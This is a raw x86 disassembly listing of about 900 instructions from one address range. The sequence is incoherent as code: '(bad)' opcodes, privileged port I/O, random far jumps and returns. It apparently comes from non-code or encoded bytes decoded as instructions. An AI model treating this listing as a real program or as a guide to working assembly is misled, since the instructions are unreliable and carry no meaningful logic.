  412f1a:	mov    fs,WORD PTR [eax]
  412f1c:	mov    ebp,0x9e0d67fd
  412f21:	adc    ebp,DWORD PTR [ebx]
  412f23:	push   0xf88ea46f
  412f28:	leave  
  412f29:	out    dx,eax
  412f2a:	mov    cl,0xfb
  412f2c:	imul   ebp,ebx,0x6b
  412f2f:	fisubr WORD PTR [ecx+0x49008112]
  412f35:	icebp  
  412f36:	jmp    0x412ef9
  412f38:	imul   esi,DWORD PTR [eax],0x6
  412f3b:	les    ebx,FWORD PTR [esi-0x160e0ca]
  412f41:	inc    esi
  412f42:	into   
  412f43:	ins    BYTE PTR es:[edi],dx
  412f44:	es xchg esi,eax
  412f46:	push   eax
  412f47:	cmp    eax,0x3f463913
  412f4c:	mov    BYTE PTR [edi-0x5b],bh
  412f4f:	jmp    0x6705:0x3bafe8ea
  412f56:	xchg   ecx,edx
  412f58:	(bad)  
  412f59:	fsubr  st,st(6)
  412f5b:	push   edi
  412f5c:	xor    BYTE PTR [ecx-0x60fdb492],0xf9
  412f63:	push   cs
  412f64:	add    esp,edi
  412f66:	xor    DWORD PTR [eax],esi
  412f68:	outs   dx,BYTE PTR ds:[esi]
  412f69:	cli    
  412f6a:	mov    ch,0x0
  412f6c:	shl    DWORD PTR [ecx-0x38],0x47
  412f70:	lods   al,BYTE PTR ds:[esi]
  412f71:	cwde   
  412f72:	jns    0x412f53
  412f74:	shl    BYTE PTR [esi-0x78],1
  412f77:	retf   
  412f78:	xchg   edi,eax
  412f79:	leave  
  412f7a:	sub    ah,ah
  412f7c:	mov    ds:0x918f9b45,al
  412f81:	pop    eax
  412f82:	out    0x12,al
  412f84:	sbb    esp,ecx
  412f86:	rol    DWORD PTR [edi-0x21],0xa5
  412f8a:	push   ecx
  412f8b:	lock mov dl,0x4c
  412f8e:	inc    ecx
  412f8f:	std    
  412f90:	or     al,0x2b
  412f92:	xchg   esi,eax
  412f93:	and    BYTE PTR [ebp+0x2eee083f],dl
  412f99:	jl     0x412f9c
  412f9b:	dec    edi
  412f9c:	sahf   
  412f9d:	fnstenv [edi]
  412f9f:	cli    
  412fa0:	add    BYTE PTR [edi+0x25180475],bl
  412fa6:	push   edx
  412fa7:	and    eax,0xb6b94138
  412fac:	ret    
  412fad:	mov    al,ds:0xeaa5970
  412fb2:	adc    dh,bh
  412fb4:	xor    eax,0x38fd50db
  412fb9:	cmc    
  412fba:	out    dx,eax
  412fbb:	lods   eax,DWORD PTR ds:[esi]
  412fbc:	cmp    eax,DWORD PTR [ecx-0x16d06acf]
  412fc2:	shr    BYTE PTR [ecx],cl
  412fc4:	loopne 0x412f80
  412fc6:	inc    ebx
  412fc7:	lahf   
  412fc8:	adc    ebp,DWORD PTR [esp+ebx*1+0xdf182ae]
  412fcf:	mov    ?,WORD PTR [ebx-0x73a0cee3]
  412fd5:	sbb    DWORD PTR [ebp-0xa],ebp
  412fd8:	pop    ss
  412fd9:	xor    ebx,DWORD PTR [edi+edx*8-0x1a]
  412fdd:	pop    ebp
  412fde:	test   DWORD PTR [eax+0x53cf7d0],ecx
  412fe4:	push   eax
  412fe5:	push   esi
  412fe6:	xlat   BYTE PTR ds:[ebx]
  412fe7:	mov    ah,0x28
  412fe9:	jg     0x413003
  412feb:	sbb    BYTE PTR [esp+eiz*8],al
  412fee:	dec    ebp
  412fef:	daa    
  412ff0:	lahf   
  412ff1:	or     bl,ch
  412ff3:	xchg   ch,bl
  412ff5:	mov    ebx,0x12f0c105
  412ffa:	xchg   ebp,eax
  412ffb:	inc    edi
  412ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ffd:	add    BYTE PTR ds:0xb491730a,ch
  413003:	fwait
  413004:	inc    ebp
  413005:	mov    ebp,0x84912249
  41300a:	inc    edx
  41300b:	ret    
  41300c:	in     al,dx
  41300d:	or     eax,edx
  41300f:	movhps QWORD PTR [eax+0x30ee656a],xmm2
  413016:	push   ss
  413017:	fisttp WORD PTR [ecx+0x38eac818]
  41301d:	jecxz  0x412ff7
  41301f:	icebp  
  413020:	es aad 0x9
  413023:	arpl   WORD PTR [edx],si
  413025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413026:	pop    eax
  413027:	nop
  413028:	jge    0x412fb3
  41302a:	je     0x412fe9
  41302c:	ret    
  41302d:	loopne 0x4130a7
  41302f:	xchg   bl,bh
  413031:	test   BYTE PTR [eax-0x2742c0bf],bh
  413037:	imul   edx,DWORD PTR [edi],0xa6005b4
  41303d:	out    0xc6,eax
  41303f:	adc    DWORD PTR [edi],esp
  413041:	jne    0x41304b
  413043:	bnd call 0x86be4ba6
  413049:	add    ebx,DWORD PTR [esi]
  41304b:	mov    ?,WORD PTR [ebp-0x3d]
  41304e:	push   cs
  41304f:	shr    DWORD PTR [edi+0x1a],0x77
  413053:	and    DWORD PTR [edi-0x6b],esi
  413056:	outs   dx,DWORD PTR ds:[si]
  413058:	cmc    
  413059:	jnp    0x4130d5
  41305b:	add    eax,0x9921071d
  413060:	mov    DWORD PTR [ecx-0x6c],eax
  413063:	mov    ah,0x35
  413065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413066:	and    DWORD PTR [eax],ecx
  413068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41306a:	inc    ebp
  41306b:	cwde   
  41306c:	push   ebp
  41306d:	sub    al,0x5e
  41306f:	lahf   
  413070:	mov    dl,0x95
  413072:	test   BYTE PTR [ebp-0x5c],0x7c
  413076:	call   0x26dd:0x45a9bc21
  41307d:	outs   dx,BYTE PTR ds:[esi]
  41307e:	dec    esp
  41307f:	loopne 0x413056
  413081:	cmp    dl,dl
  413083:	inc    eax
  413084:	loope  0x413069
  413086:	xor    bh,BYTE PTR [edi-0x3b140e73]
  41308c:	sub    eax,0xeffc121b
  413091:	cmp    edi,DWORD PTR [ebx]
  413093:	retf   
  413094:	cmp    edi,DWORD PTR [ebp+0x7c]
  413097:	addr16 or ebx,ecx
  41309a:	and    dl,dh
  41309c:	pop    eax
  41309d:	adc    eax,0xd871d314
  4130a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130a3:	(bad)  
  4130a4:	sub    dh,BYTE PTR [esi]
  4130a6:	xor    eax,0x99a4c92b
  4130ab:	jb     0x413110
  4130ad:	dec    ebp
  4130ae:	loop   0x413089
  4130b0:	ror    DWORD PTR [eax+ebp*1],0x1c
  4130b4:	add    cl,BYTE PTR [edx-0x4c00b6f6]
  4130ba:	test   eax,0xfece736d
  4130bf:	pop    ebp
  4130c0:	push   0xdd601fad
  4130c5:	int3   
  4130c6:	in     eax,dx
  4130c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130c8:	out    0x31,al
  4130ca:	dec    ebp
  4130cb:	push   ss
  4130cc:	adc    DWORD PTR cs:[ebx-0x29],ebx
  4130d0:	xor    BYTE PTR [edx-0x7f],0xc8
  4130d4:	fimul  WORD PTR [ecx-0x788daacc]
  4130da:	ss xor ecx,eax
  4130dd:	out    0xc3,al
  4130df:	cli    
  4130e0:	addr16 inc ebx
  4130e2:	jbe    0x41306f
  4130e4:	dec    ecx
  4130e5:	xchg   edi,eax
  4130e6:	add    edi,ebp
  4130e8:	sbb    BYTE PTR [edx+0x71],al
  4130eb:	sti    
  4130ec:	mov    ds:0xdf2d4c44,al
  4130f1:	stc    
  4130f2:	aam    0x27
  4130f4:	rcl    bh,cl
  4130f6:	cld    
  4130f7:	push   ds
  4130f8:	cmp    al,0x8b
  4130fa:	imul   edi,edi,0x73
  4130fd:	jbe    0x41308e
  4130ff:	jle    0x413106
  413101:	jns    0x4130ba
  413103:	dec    ebx
  413104:	psubb  mm1,mm6
  413107:	sbb    BYTE PTR [eax-0x2f],al
  41310a:	aaa    
  41310b:	mov    DWORD PTR [ecx],ebx
  41310d:	loopne 0x4130e7
  41310f:	stos   DWORD PTR es:[edi],eax
  413110:	sub    eax,0xd80f3dba
  413115:	add    DWORD PTR [edx],edi
  413117:	add    al,0x97
  413119:	fcomp  QWORD PTR [edx+0x1c]
  41311c:	cmp    BYTE PTR [edx-0x11c747e9],al
  413122:	stc    
  413123:	mov    DWORD PTR [edx+edx*8-0x3a],ebx
  413127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413128:	mov    esi,DWORD PTR [esi+0x73538fd]
  41312e:	leave  
  41312f:	sbb    DWORD PTR [ecx],esp
  413131:	add    al,0x4f
  413133:	push   esi
  413134:	jg     0x413186
  413136:	or     cl,BYTE PTR [eax]
  413138:	pusha  
  413139:	jns    0x4131a5
  41313b:	or     BYTE PTR [esi-0x54deb146],0x4d
  413142:	mov    al,ds:0xc1a077b9
  413147:	xchg   BYTE PTR [eax+0x31d6dc73],ch
  41314d:	sbb    ah,BYTE PTR ds:0x79ade64a
  413153:	stos   BYTE PTR es:[edi],al
  413154:	mov    dh,0xc7
  413156:	mov    eax,ds:0x1a430ef8
  41315b:	rcl    DWORD PTR [ebx],cl
  41315d:	sbb    cl,al
  41315f:	in     al,0x24
  413161:	push   esp
  413162:	aam    0xaa
  413164:	fmul   QWORD PTR [edx+0x5a]
  413167:	dec    edi
  413168:	lds    edi,FWORD PTR [edi+0x5188a669]
  41316e:	xor    ecx,eax
  413170:	xor    BYTE PTR [ecx-0x50],al
  413173:	data16 fnstcw WORD PTR [ebx]
  413176:	sub    dl,BYTE PTR [eax-0x22]
  413179:	out    0x9e,eax
  41317b:	pop    edi
  41317c:	or     ch,BYTE PTR [ecx-0x355fa30e]
  413182:	test   BYTE PTR [edx+0x1],ah
  413185:	mov    cl,0x70
  413187:	fwait
  413188:	stos   DWORD PTR es:[edi],eax
  413189:	mov    edi,0x9b7586c4
  41318e:	inc    ebp
  41318f:	pop    ds
  413190:	mov    al,0xdb
  413192:	jo     0x413190
  413194:	mov    ah,0xba
  413196:	popf   
  413197:	mov    DWORD PTR [edi-0x668f2fb0],0x17edcf5c
  4131a1:	aad    0x69
  4131a3:	and    eax,0xb980d24d
  4131a8:	dec    ecx
  4131a9:	and    DWORD PTR [ebx+0x308eb2a0],0x60535529
  4131b3:	jne    0x413207
  4131b5:	aam    0x49
  4131b7:	(bad)  
  4131b8:	ret    0x749a
  4131bb:	add    ch,BYTE PTR [edx+ebx*4-0x4]
  4131bf:	in     eax,dx
  4131c0:	xor    BYTE PTR [eax],dl
  4131c2:	xlat   BYTE PTR ds:[ebx]
  4131c3:	mov    WORD PTR [edi+0x11403edb],ss
  4131c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ca:	inc    eax
  4131cb:	jb     0x413221
  4131cd:	inc    esp
  4131ce:	xor    dh,BYTE PTR [ecx+0x60]
  4131d1:	daa    
  4131d2:	call   DWORD PTR [esi-0x75]
  4131d5:	inc    edi
  4131d6:	sbb    al,0x93
  4131d8:	dec    edi
  4131d9:	outs   dx,BYTE PTR ds:[esi]
  4131da:	inc    edx
  4131db:	outs   dx,BYTE PTR ds:[esi]
  4131dc:	jo     0x4131e8
  4131de:	shr    BYTE PTR [ecx],0x96
  4131e1:	pusha  
  4131e2:	add    eax,0xabcc1fb2
  4131e7:	sub    eax,0x14dcf1e6
  4131ec:	fwait
  4131ed:	mov    edx,0x2bbf03a8
  4131f2:	jmp    0xc81d:0xeef3f748
  4131f9:	test   BYTE PTR [eax-0x54],ah
  4131fc:	pop    ss
  4131fd:	pop    ecx
  4131fe:	mov    eax,ds:0xbc4e99ff
  413203:	test   BYTE PTR [ecx],ch
  413205:	test   BYTE PTR [edx-0x58f6b64b],cl
  41320b:	pop    ecx
  41320c:	ret    0x4986
  41320f:	fsubr  QWORD PTR [edi-0x5f]
  413212:	cs inc ebx
  413214:	mov    ecx,0xc9bdaca6
  413219:	cmc    
  41321a:	mov    ah,0x75
  41321c:	lock mov edx,0xb454b4b6
  413222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413225:	mov    DWORD PTR [ebx-0x6349c78b],esi
  41322b:	scas   eax,DWORD PTR es:[edi]
  41322c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41322d:	dec    esp
  41322e:	and    edx,DWORD PTR [ecx]
  413230:	xchg   ecx,eax
  413231:	(bad)
  413235:	inc    esi
  413236:	dec    ebx
  413237:	shr    edx,1
  413239:	xor    DWORD PTR [ecx+0x154303d2],esi
  41323f:	fisubr DWORD PTR [eax-0x74]
  413242:	push   esp
  413243:	out    0x2,eax
  413245:	test   al,0x66
  413247:	arpl   WORD PTR [esi-0x2a8f68be],dx
  41324d:	mov    cl,0x1e
  41324f:	or     eax,0x2e601a22
  413254:	mov    esi,0x247a5d68
  413259:	dec    eax
  41325a:	je     0x41323c
  41325c:	jae    0x4132d7
  41325e:	xor    eax,0x9338dfff
  413263:	dec    ebx
  413264:	sub    DWORD PTR cs:[edx-0x79],ecx
  413268:	push   ds
  413269:	mov    bh,0xaa
  41326b:	ja     0x4132ad
  41326d:	into   
  41326e:	(bad)  
  41326f:	sub    esp,ebx
  413271:	jmp    0xbb12:0x467be893
  413278:	pop    ebp
  413279:	cs cmp al,0xe9
  41327c:	push   esi
  41327d:	out    0x9e,al
  41327f:	test   eax,0x5c882d98
  413284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413285:	fcom   QWORD PTR [eax-0x29]
  413288:	stos   DWORD PTR es:[edi],eax
  413289:	rcl    BYTE PTR [ecx-0x5b8ceab6],cl
  41328f:	fldenv [ecx+edi*1]
  413292:	mov    dl,0xb7
  413294:	or     DWORD PTR [edx-0x77],ecx
  413297:	xchg   esi,eax
  413298:	ins    DWORD PTR es:[edi],dx
  413299:	lock sub ebp,DWORD PTR [edx-0xe36cad6]
  4132a0:	adc    eax,0x69860971
  4132a5:	add    BYTE PTR [esi-0x9],bh
  4132a8:	xchg   ebx,eax
  4132a9:	je     0x41326c
  4132ab:	outs   dx,DWORD PTR ds:[esi]
  4132ac:	mov    ds:0x69f3fcea,eax
  4132b1:	jbe    0x413307
  4132b3:	fst    QWORD PTR [edx+0x73]
  4132b6:	dec    ecx
  4132b7:	mov    ebx,0x500612c9
  4132bc:	leave  
  4132bd:	push   esp
  4132be:	mov    esp,0x70fecd0
  4132c3:	xchg   ebx,eax
  4132c4:	stos   BYTE PTR es:[edi],al
  4132c5:	sub    ebp,DWORD PTR [ebp+eiz*1+0x106ecfd2]
  4132cc:	sbb    edx,eax
  4132ce:	or     BYTE PTR [esi+0x3e],bh
  4132d1:	add    eax,0x58b95764
  4132d6:	xchg   esi,eax
  4132d7:	and    dl,BYTE PTR ds:0x8c244a01
  4132dd:	jnp    0x413323
  4132df:	inc    ebp
  4132e0:	xchg   edi,eax
  4132e1:	popa   
  4132e2:	in     eax,dx
  4132e3:	xor    ebx,DWORD PTR [eax+0x3e]
  4132e6:	lods   eax,DWORD PTR ds:[esi]
  4132e7:	jmp    0x82257858
  4132ec:	inc    ebp
  4132ed:	inc    ebx
  4132ee:	mov    ecx,DWORD PTR [esi]
  4132f0:	mov    bh,bh
  4132f2:	push   ebp
  4132f3:	mov    ecx,0x6df951a0
  4132f8:	xchg   esp,eax
  4132f9:	mov    fs,WORD PTR [esi+0x18fa72a4]
  4132ff:	rcr    BYTE PTR [esi],1
  413301:	add    eax,0x1c20d8b8
  413306:	nop
  413307:	dec    edi
  413308:	mov    dh,BYTE PTR [edi-0x6564bd9d]
  41330e:	cld    
  41330f:	xchg   ebp,eax
  413310:	cmp    ch,dh
  413312:	aam    0xf9
  413314:	mov    ebx,0x16b2f13f
  413319:	dec    esi
  41331a:	sbb    BYTE PTR [edx+0x42],dh
  41331d:	dec    esi
  41331e:	xor    BYTE PTR [eax+0x4d9d1a50],ch
  413324:	mov    edi,0x2cadc2b
  413329:	popf   
  41332a:	inc    esp
  41332b:	je     0x413300
  41332d:	div    bh
  41332f:	jnp    0x41335f
  413331:	and    edx,DWORD PTR [ecx]
  413333:	leave  
  413334:	adc    al,0xda
  413336:	sub    BYTE PTR [ecx+0x4f],0x9a
  41333a:	dec    esp
  41333b:	outs   dx,BYTE PTR ds:[esi]
  41333c:	lods   al,BYTE PTR ds:[esi]
  41333d:	cmp    esi,edi
  41333f:	xchg   ebx,eax
  413340:	xor    ebp,esi
  413342:	outs   dx,BYTE PTR ds:[esi]
  413343:	(bad)  
  413345:	pop    es
  413346:	cmp    ch,bh
  413348:	xchg   ebp,eax
  413349:	pusha  
  41334a:	mov    eax,ds:0x57cc0523
  41334f:	in     al,dx
  413350:	pop    edx
  413351:	(bad)  
  413352:	lods   eax,DWORD PTR ds:[esi]
  413353:	or     al,0xb2
  413355:	shl    BYTE PTR [eax+0x23d90002],1
  41335b:	fmul   st,st(4)
  41335d:	xor    al,BYTE PTR [ebp-0x746d2c92]
  413363:	cmp    esi,ebx
  413365:	mov    es,ebx
  413367:	inc    ebp
  413368:	cmp    edi,esi
  41336a:	mov    edi,0x24724cb4
  41336f:	sub    ebp,DWORD PTR [ebx]
  413371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413372:	in     eax,0x18
  413374:	cmp    BYTE PTR [esi],ch
  413376:	test   eax,0x9f3dfdb0
  41337b:	not    BYTE PTR [eax]
  41337d:	and    BYTE PTR [esi],cl
  41337f:	or     eax,0x779b6161
  413384:	sub    DWORD PTR [ecx+0x3],eax
  413387:	push   ebp
  413388:	mov    ebp,0x2ed1476c
  41338d:	mov    eax,ds:0x5e54530f
  413392:	xor    al,0xec
  413394:	retf   
  413395:	jmp    0xaf88cdd0
  41339a:	pusha  
  41339b:	cmp    BYTE PTR [eax+0x60],bh
  41339e:	jle    0x41337b
  4133a0:	icebp  
  4133a1:	mov    dl,0x91
  4133a3:	lahf   
  4133a4:	push   edx
  4133a5:	mov    eax,0x171f81f
  4133aa:	and    al,0xb7
  4133ac:	jnp    0x4133a4
  4133ae:	inc    edi
  4133af:	jle    0x4133d0
  4133b1:	and    edx,DWORD PTR [ecx]
  4133b3:	sub    eax,0xa7f8160a
  4133b8:	loopne 0x4133fb
  4133ba:	pushf  
  4133bb:	in     al,0xe6
  4133bd:	mov    bl,0x88
  4133bf:	jp     0x4133d5
  4133c1:	push   ds
  4133c2:	sbb    eax,0x1be0bae8
  4133c7:	fcomp  QWORD PTR [ebp-0x5d4a3500]
  4133cd:	push   esp
  4133ce:	xor    eax,0x8acca2a2
  4133d3:	sti    
  4133d4:	push   ss
  4133d5:	hlt    
  4133d6:	sub    BYTE PTR [ecx+0x62],dl
  4133d9:	mov    gs,edi
  4133db:	jns    0x4133e0
  4133dd:	dec    ebx
  4133de:	mov    ebx,0x9918e793
  4133e3:	mov    ecx,0xd97e87c1
  4133e8:	mov    al,ds:0x24f2ae6
  4133ed:	std    
  4133ee:	popf   
  4133ef:	mov    bh,0x19
  4133f1:	pop    es
  4133f2:	inc    esi
  4133f3:	stc    
  4133f4:	test   al,0xe1
  4133f6:	or     eax,0x8d72a1ca
  4133fb:	or     BYTE PTR [edi-0x62abe593],dh
  413401:	mov    ecx,0xf335de39
  413406:	aas    
  413407:	and    al,0x8f
  413409:	dec    ebp
  41340a:	cld    
  41340b:	xor    eax,0xae2d45f5
  413410:	and    al,0x1a
  413412:	aas    
  413413:	std    
  413414:	ins    BYTE PTR es:[edi],dx
  413415:	xchg   esi,eax
  413416:	inc    edi
  413417:	data16 mov dl,0x78
  41341a:	pop    esp
  41341b:	jle    0x4133c5
  41341d:	std    
  41341e:	push   es
  41341f:	jbe    0x413482
  413421:	popa   
  413422:	fs call 0xad59ca71
  413428:	inc    edx
  413429:	jae    0x413445
  41342b:	push   cs
  41342c:	xchg   ebp,edi
  41342e:	sub    DWORD PTR [edx],esp
  413430:	out    dx,al
  413431:	fwait
  413432:	call   0x4271:0x56df5a26
  413439:	fbld   TBYTE PTR [edx]
  41343b:	mov    BYTE PTR [ecx],dh
  41343d:	icebp  
  41343e:	cli    
  41343f:	cli    
  413440:	add    DWORD PTR [edx*8-0x64eee036],esp
  413447:	sbb    esi,edx
  413449:	fisub  DWORD PTR [edx-0x78c15638]
  41344f:	aas    
  413450:	pop    esi
  413451:	in     eax,0xf1
  413453:	xchg   BYTE PTR [edi+0x15],cl
  413456:	shl    BYTE PTR [ebx-0x11],0x9e
  41345a:	pop    esp
  41345b:	ucomiss xmm1,xmm1
  41345e:	or     DWORD PTR [esi],ecx
  413460:	push   ebx
  413461:	mov    ebx,DWORD PTR [esi-0x7b]
  413464:	nop
  413465:	sbb    DWORD PTR [ebp-0x20],ecx
  413468:	shr    BYTE PTR [esi],1
  41346a:	pop    es
  41346b:	push   ebx
  41346c:	mov    edx,0x254dab46
  413471:	jg     0x4134ca
  413473:	pop    ds
  413474:	or     bl,BYTE PTR [esi+esi*8-0x45617a51]
  41347b:	or     dl,BYTE PTR [eax-0x5]
  41347e:	loopne 0x413477
  413480:	in     al,dx
  413481:	pop    edx
  413482:	mov    esp,edx
  413484:	cmp    BYTE PTR [edi-0x7],bl
  413487:	fnsave [eax-0x3b]
  41348a:	inc    ebp
  41348b:	cmp    bh,BYTE PTR [esi-0x9228e0b]
  413491:	(bad)  
  413492:	pop    ecx
  413493:	xlat   BYTE PTR ds:[ebx]
  413494:	jb     0x4134ed
  413496:	jno    0x41341f
  413498:	ret    0x47d0
  41349b:	xchg   DWORD PTR [edi],esi
  41349d:	jbe    0x4134b4
  41349f:	xchg   ch,bh
  4134a1:	mov    dh,0x7d
  4134a3:	inc    ebx
  4134a4:	sub    bh,BYTE PTR [ebx]
  4134a6:	or     al,bh
  4134a8:	out    0x80,eax
  4134aa:	(bad)  
  4134ab:	ror    BYTE PTR [edi+0x7db0a070],1
  4134b1:	sub    DWORD PTR [edx],esp
  4134b3:	and    BYTE PTR [ebx+0x52],0xd1
  4134b7:	mov    edx,0x21034964
  4134bc:	or     BYTE PTR [edi+eiz*1+0x1d],0xf0
  4134c1:	dec    ebx
  4134c2:	fxam   
  4134c4:	cmp    ch,al
  4134c6:	add    BYTE PTR [edx-0x2c],ah
  4134c9:	(bad)  
  4134ca:	mov    WORD PTR [edx-0x256c85dd],cs
  4134d0:	push   es
  4134d1:	push   esi
  4134d2:	pushf  
  4134d3:	xor    al,0x29
  4134d5:	(bad)  
  4134d6:	push   0x5c550d86
  4134db:	fistp  DWORD PTR [eax+0x6dff2e5c]
  4134e1:	arpl   si,sp
  4134e3:	xchg   esp,eax
  4134e4:	test   al,0xe9
  4134e6:	or     dl,BYTE PTR [edx+0x66a9c603]
  4134ec:	jb     0x41356c
  4134ee:	fisttp QWORD PTR [ebp-0x6a6aebf1]
  4134f4:	sahf   
  4134f5:	aam    0x4e
  4134f7:	dec    edx
  4134f8:	or     ebp,ecx
  4134fa:	xor    DWORD PTR [ecx],edx
  4134fc:	jp     0x4134a1
  4134fe:	pop    ss
  4134ff:	or     eax,DWORD PTR [esi+0x577944a1]
  413505:	xchg   esi,eax
  413506:	and    ebx,DWORD PTR ds:0x73045aff
  41350c:	test   eax,0xe6891b5a
  413511:	jnp    0x4134f6
  413513:	adc    al,0x3b
  413515:	mov    eax,ds:0x9d83fd8
  41351a:	push   edx
  41351b:	inc    esi
  41351c:	retf   0x5a81
  41351f:	mov    eax,0x75859be
  413524:	(bad)  
  413525:	out    0xcf,eax
  413527:	mov    ah,0xe7
  413529:	push   ds
  41352a:	fist   WORD PTR [ecx+0x5bc3b03]
  413530:	lods   eax,DWORD PTR ds:[esi]
  413531:	xor    al,0xf7
  413533:	push   ebp
  413534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413535:	dec    edi
  413536:	stc    
  413537:	call   0x13ba631c
  41353c:	xor    DWORD PTR [eax-0x249b04b4],0xffffff94
  413543:	in     eax,0x24
  413545:	aad    0x70
  413547:	cmp    edx,DWORD PTR [edi-0x13]
  41354a:	xor    al,0x85
  41354c:	mov    ecx,0x29461d00
  413551:	jb     0x4135ae
  413553:	add    bh,0x80
  413556:	mov    eax,DWORD PTR [ebp-0x30]
  413559:	cmp    BYTE PTR [edi],dl
  41355b:	and    eax,0x510607b7
  413560:	mov    dl,BYTE PTR [ebx+0x56]
  413563:	xlat   BYTE PTR ds:[ebx]
  413564:	aad    0xfa
  413566:	fidiv  DWORD PTR [edi-0x1]
  413569:	out    dx,eax
  41356a:	fistp  DWORD PTR [eax]
  41356c:	xchg   ebx,eax
  41356d:	sbb    eax,DWORD PTR [esi+edx*4+0x34]
  413571:	js     0x41350c
  413573:	xchg   ebp,eax
  413574:	jo     0x413556
  413576:	in     eax,0x49
  413578:	mov    ds:0xaffc523e,al
  41357d:	retf   0x8881
  413580:	mov    ebx,0x59c95451
  413585:	mov    eax,0xaf2cb7a1
  41358a:	cmp    ebp,DWORD PTR [ebp+0x50]
  41358d:	inc    esi
  41358e:	xbegin 0x4d0e1541
  413594:	(bad)  
  413595:	fsubp  st(6),st
  413597:	cmp    eax,0x8a8a9600
  41359c:	ficomp WORD PTR [esi+0x3e]
  41359f:	ss adc eax,0x7f9e7bf
  4135a5:	mov    BYTE PTR [ecx],al
  4135a7:	xor    al,0x78
  4135a9:	stc    
  4135aa:	stc    
  4135ab:	mov    edi,0xda97cf28
  4135b0:	in     al,dx
  4135b1:	jg     0x4135f0
  4135b3:	add    DWORD PTR [ebx+ecx*8],ebp
  4135b6:	out    0xaa,eax
  4135b8:	fucomip st,st(5)
  4135ba:	fisub  WORD PTR [eax+0x73]
  4135bd:	mov    al,0x7
  4135bf:	popa   
  4135c0:	xor    DWORD PTR [edx+0x209bbaf9],eax
  4135c6:	cs dec edi
  4135c8:	xchg   esp,eax
  4135c9:	adc    eax,0xe9a221eb
  4135ce:	jne    0x4135fd
  4135d0:	int    0xd8
  4135d2:	inc    edi
  4135d3:	mov    DWORD PTR [edi],edx
  4135d5:	push   ebp
  4135d6:	aad    0xa8
  4135d8:	int3   
  4135d9:	aaa    
  4135da:	cmp    DWORD PTR [ebx],eax
  4135dc:	and    ebp,esp
  4135de:	in     eax,0xfd
  4135e0:	mov    esi,0x2fd4e708
  4135e5:	xchg   ebx,eax
  4135e6:	dec    edx
  4135e7:	aas    
  4135e8:	inc    ebp
  4135e9:	jbe    0x4135b3
  4135eb:	clc    
  4135ec:	iret   
  4135ed:	or     al,0x71
  4135ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135f0:	inc    eax
  4135f1:	add    DWORD PTR [ecx-0x8dbef1c],esp
  4135f7:	xor    DWORD PTR [edi],eax
  4135f9:	(bad)  
  4135fa:	fstp   QWORD PTR [esi]
  4135fc:	lea    ebp,[eax]
  4135fe:	xor    bh,BYTE PTR [ebx]
  413600:	div    ebp
  413602:	cmc    
  413603:	(bad)  
  413605:	fs cld 
  413607:	jbe    0x41362a
  413609:	xlat   BYTE PTR ds:[ebx]
  41360a:	mov    ch,0x93
  41360c:	push   ds
  41360d:	pop    eax
  41360e:	cmp    DWORD PTR [ecx],esp
  413610:	pushf  
  413611:	outs   dx,BYTE PTR ds:[esi]
  413612:	je     0x4135f9
  413614:	xor    dh,BYTE PTR [edx+0x1]
  413617:	and    al,0xf8
  413619:	lods   eax,DWORD PTR ds:[esi]
  41361a:	imul   edx,DWORD PTR [edx-0x3b11d7d1],0xffffff81
  413621:	dec    esp
  413622:	sub    al,0x51
  413624:	test   DWORD PTR [ecx+0x1b],edx
  413627:	jecxz  0x413672
  413629:	es jle 0x413668
  41362c:	jge    0x413667
  41362e:	outs   dx,BYTE PTR ds:[esi]
  41362f:	lods   eax,DWORD PTR ds:[esi]
  413630:	js     0x41366e
  413632:	into   
  413633:	sbb    eax,0xf0ca494
  413638:	mov    ah,0x6d
  41363a:	int    0xe3
  41363c:	out    dx,eax
  41363d:	nop
  41363e:	aaa    
  41363f:	lds    esp,FWORD PTR fs:[eax+0x13]
  413643:	iret   
  413644:	imul   ebx,ebp,0x37f29ed0
  41364a:	leave  
  41364b:	inc    edx
  41364c:	test   dh,cl
  41364e:	xor    BYTE PTR [edx-0x2aba46fd],ah
  413654:	test   BYTE PTR [edi+ebp*8-0x39dd06e0],ah
  41365b:	scas   al,BYTE PTR es:[edi]
  41365c:	rcr    DWORD PTR [eax+0x2a],cl
  41365f:	int    0x48
  413661:	add    BYTE PTR [esi-0x75],0x6c
  413665:	xlat   BYTE PTR ds:[ebx]
  413666:	push   cs
  413667:	cmp    dl,BYTE PTR ds:0x4a5f7c27
  41366d:	dec    ebp
  41366e:	jb     0x41364e
  413670:	out    0xb1,al
  413672:	daa    
  413673:	mov    ds:0x32f772bd,al
  413678:	cmp    bh,cl
  41367a:	and    al,0x66
  41367c:	aam    0x54
  41367e:	out    0xf4,eax
  413680:	ins    BYTE PTR es:[edi],dx
  413681:	xchg   esi,eax
  413682:	ins    DWORD PTR es:[edi],dx
  413683:	mov    eax,0x54064a29
  413688:	popa   
  413689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41368a:	test   DWORD PTR [ebx],edx
  41368c:	stos   BYTE PTR es:[edi],al
  41368d:	and    eax,0x2dfb16d5
  413692:	sbb    esi,0x2363f7d2
  413698:	push   ds
  413699:	xchg   DWORD PTR [ecx+ebp*1-0x7a],edx
  41369d:	popa   
  41369e:	lahf   
  41369f:	pop    edx
  4136a0:	add    al,0x6
  4136a2:	inc    eax
  4136a3:	fiadd  WORD PTR [eax-0x4c534473]
  4136a9:	frstor [esi+0x2547864f]
  4136af:	push   eax
  4136b0:	repnz pusha 
  4136b2:	xchg   ebx,eax
  4136b3:	popf   
  4136b4:	mov    dh,0x98
  4136b6:	dec    BYTE PTR [eax]
